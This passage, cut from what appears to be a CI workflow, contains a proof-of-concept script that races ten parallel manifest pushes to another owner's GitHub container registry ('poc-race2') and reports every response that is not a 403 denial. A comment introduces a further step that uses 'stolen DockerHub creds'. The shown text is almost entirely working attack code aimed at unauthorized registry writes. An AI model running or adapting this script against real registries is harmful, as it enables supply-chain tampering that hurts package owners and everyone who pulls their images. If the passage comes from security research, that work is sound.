              -H "Content-Type: application/vnd.docker.distribution.manifest.v2+json" \
              "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/manifests/race-$i" \
              -d "$MANIFEST" &
          done
          wait
          for i in $(seq 1 10); do
            CODE=$(cat /tmp/ghcr_$i.txt 2>/dev/null | tail -1)
            [ "$CODE" != "HTTP_403" ] && echo "  ghcr-$i: $CODE"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 8: npm/registry with stolen DockerHub creds context
